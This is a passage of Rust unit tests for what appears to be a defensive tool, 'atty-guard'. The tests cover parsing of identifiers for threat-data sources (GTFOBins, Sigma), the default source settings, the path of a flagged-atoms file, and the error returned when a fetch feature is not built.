        // `lolbas` was removed — see module docs for the rationale.
        assert_eq!(SourceId::parse("lolbas"), None);
        assert_eq!(SourceId::parse("unknown"), None);
        assert_eq!(SourceId::parse(""), None);
    }

    #[test]
    fn default_enabled_includes_both_linux_sources() {
        let defaults = SourceId::default_enabled();
        assert!(defaults.contains(&SourceId::Gtfobins));
        assert!(defaults.contains(&SourceId::Sigma));
        assert_eq!(defaults.len(), 2);
    }

    #[test]
    fn source_id_name_round_trip() {
        for sid in SourceId::default_enabled() {
            assert!(SourceId::parse(sid.name()).is_some());
        }
    }

    #[test]
    fn default_atoms_path_under_xdg_or_home() {
        let p = default_atoms_path();
        assert!(p.ends_with("flagged_atoms.txt"));
        assert!(p.to_string_lossy().contains("atty-guard"));
    }

    #[test]
    fn fetch_error_display_includes_hint() {
        let e = FetchError::FeatureNotBuilt;
        let s = format!("{e}");
        assert!(s.contains("atoms-fetch"));
    }

    #[cfg(not(feature = "atoms-fetch"))]
    #[test]
    fn fetch_without_feature_errors_cleanly() {
        match fetch_all(&FetcherConfig::default(), &[SourceId::Gtfobins]) {
            Err(FetchError::FeatureNotBuilt) => {}
            Ok(_) => panic!("expected FeatureNotBuilt on default build"),
            Err(other) => panic!("expected FeatureNotBuilt, got {other}"),
        }
    }
}
